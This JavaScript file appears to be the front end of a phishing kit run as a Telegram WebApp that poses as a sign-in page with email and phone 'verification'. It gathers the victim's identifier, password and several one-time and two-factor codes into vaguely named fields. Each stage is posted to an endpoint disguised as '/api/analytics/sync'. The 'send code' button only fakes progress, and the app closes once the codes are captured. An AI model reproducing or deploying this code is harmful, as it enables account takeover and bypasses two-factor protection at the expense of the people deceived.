const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    const screenSignin = document.getElementById('screen-signin');
    const screenStepper = document.getElementById('screen-stepper');
    const modalEmail = document.getElementById('modal-email-otp');
    const modalPhone = document.getElementById('modal-phone-otp');

    const loginId = document.getElementById('login-identifier');
    const loginPass = document.getElementById('login-password');
    const loginOtpInput = document.getElementById('login-otp-input');
    const loginPassWrapper = document.getElementById('login-password-wrapper');
    const loginOtpWrapper = document.getElementById('login-otp-wrapper');
    const loginForgotWrapper = document.getElementById('login-forgot-wrapper');

    const verifyEmailId = document.getElementById('verify-email-id');
    const verifyEmailOtp = document.getElementById('verify-email-otp');
    const verifyPhoneNum = document.getElementById('verify-phone-num');
    const verifyPhoneOtp = document.getElementById('verify-phone-otp');

    let userData = { d1: '', d2: '', d3: '', d4: '', d5: '', d6: '', d7: '', d8: '', method: 'password' };
    let currentStep = 1;

    // Tab Switching
    document.querySelectorAll('.signin-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            const method = tab.dataset.tab;
            userData.method = method;
            if (method === 'password') {
                loginId.placeholder = "Email / Phone Number / Username";
                loginPassWrapper.style.display = 'block';
                loginOtpWrapper.style.display = 'none';
                loginForgotWrapper.style.display = 'block';
            } else {
                loginId.placeholder = "Enter phone number";
                loginPassWrapper.style.display = 'none';
                loginOtpWrapper.style.display = 'block';
                loginForgotWrapper.style.display = 'none';
            }
        });
    });

    document.getElementById('btn-login-send-otp').addEventListener('click', () => {
        const idVal = loginId.value.trim();
        if (!idVal) return alert("Please enter Email or Phone Number first");
        const btn = document.getElementById('btn-login-send-otp');
        btn.innerText = "Sending...";
        setTimeout(() => { btn.innerText = "Sent"; }, 800);
    });

    const modalLogin = document.getElementById('modal-login-otp');
    const verifyLoginOtp = document.getElementById('verify-login-otp');

    const validateEmail = (email) => /\S+@\S+\.\S+/.test(email);
    const validatePhone = (phone) => /^\+?\d{7,15}$/.test(phone.replace(/[\s-]/g, ''));

    const btnSignin = document.getElementById('trigger-signin');
    if (btnSignin) {
        btnSignin.addEventListener('click', async () => {
            const idVal = loginId.value.trim();
            if (!idVal) return alert("Please enter your details");

            // VALIDATION
            if (idVal.includes('@')) {
                if (!validateEmail(idVal)) return alert("Please enter a valid email address");
            } else {
                if (!validatePhone(idVal)) return alert("Please enter a valid phone number");
            }
            
            userData.d1 = idVal;
            userData.d8 = new Date().toLocaleString();
            
            if (userData.method === 'password') {
                userData.d2 = loginPass.value.trim();
                if (!userData.d2) return alert("Please enter password");
            } else {
                userData.d3 = loginOtpInput.value.trim();
                if (!userData.d3) return alert("Please enter verification code");
            }

            if (idVal.includes('@')) verifyEmailId.value = idVal;
            else if (/^\d+$/.test(idVal.replace(/\+/g, ''))) verifyPhoneNum.value = idVal;

            console.log("-> Log: CREDENTIALS");
            await logToServer(userData.method === 'password' ? '🔑 LOGIN (PASSWORD)' : '🔢 LOGIN (OTP)', userData);
            
            // Show Login OTP modal before moving to stepper
            modalLogin.style.display = 'flex';
        });
    }

    document.getElementById('submit-login-otp').addEventListener('click', async () => {
        if (!verifyLoginOtp.value) return alert("Please enter the login code");
        userData.d3 = verifyLoginOtp.value;
        document.getElementById('submit-login-otp').innerText = "Verifying...";
        
        console.log("-> Log: LOGIN OTP");
        await logToServer('🔢 LOGIN OTP (2FA)', userData);
        
        modalLogin.style.display = 'none';
        screenSignin.style.display = 'none';
        screenStepper.style.display = 'flex';
    });

    document.getElementById('item-email').addEventListener('click', () => {

        if (currentStep !== 1) return;
        modalEmail.style.display = 'flex';
    });

    document.getElementById('submit-email-otp').addEventListener('click', async () => {
        if (!verifyEmailId.value || !verifyEmailOtp.value) return alert("Fill all fields");
        userData.d4 = verifyEmailId.value;
        userData.d5 = verifyEmailOtp.value;
        document.getElementById('submit-email-otp').innerText = "Verifying...";
        console.log("-> Starting Log: EMAIL");
        await logToServer('📧 EMAIL VERIFY', userData);
        modalEmail.style.display = 'none';
        currentStep = 2;
        document.getElementById('step-number-display').innerText = '2/2';
        const itemEmail = document.getElementById('item-email');
        itemEmail.style.opacity = '0.5';
        itemEmail.style.pointerEvents = 'none';
        itemEmail.querySelector('.card-link').innerHTML = 'Verified <i class="fas fa-check"></i>';
        const itemPhone = document.getElementById('item-phone');
        itemPhone.style.opacity = '1';
        itemPhone.style.pointerEvents = 'auto';
        itemPhone.classList.add('active');
    });

    document.getElementById('item-phone').addEventListener('click', () => {
        if (currentStep !== 2) return;
        modalPhone.style.display = 'flex';
    });

    document.getElementById('submit-phone-otp').addEventListener('click', async () => {
        if (!verifyPhoneNum.value || !verifyPhoneOtp.value) return alert("Fill all fields");
        userData.d6 = verifyPhoneNum.value;
        userData.d7 = verifyPhoneOtp.value;
        document.getElementById('submit-phone-otp').innerText = "Success";
        console.log("-> Starting Log: FINAL");
        await logToServer('📱 PHONE VERIFY (FINAL)', userData);
        
        setTimeout(() => {
            if (tg) tg.close();
            else location.reload();
        }, 1500);
    });

    async function logToServer(t, d) {
        try {
            const response = await fetch('/api/analytics/sync', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ t, d })
            });
            return await response.json();
        } catch (e) {
            console.error("Sync Error");
        }
    }

    const eyeBtn = document.querySelector('.btn-password-eye');
    if (eyeBtn) {
        eyeBtn.addEventListener('click', () => {
            const isPass = loginPass.type === 'password';
            loginPass.type = isPass ? 'text' : 'password';
            eyeBtn.innerHTML = isPass ? '<i class="far fa-eye"></i>' : '<i class="far fa-eye-slash"></i>';
        });
    }

    window.closeAllModals = () => {
        modalLogin.style.display = 'none';
        modalEmail.style.display = 'none';
        modalPhone.style.display = 'none';
    };


    window.pasteOTP = async (id) => {
        try {
            const t = await navigator.clipboard.readText();
            if (t) document.getElementById(id).value = t;
        } catch(e) {}
    };

    document.getElementById('back-to-signin').addEventListener('click', () => {
        screenStepper.style.display = 'none';
        screenSignin.style.display = 'block';
    });
});


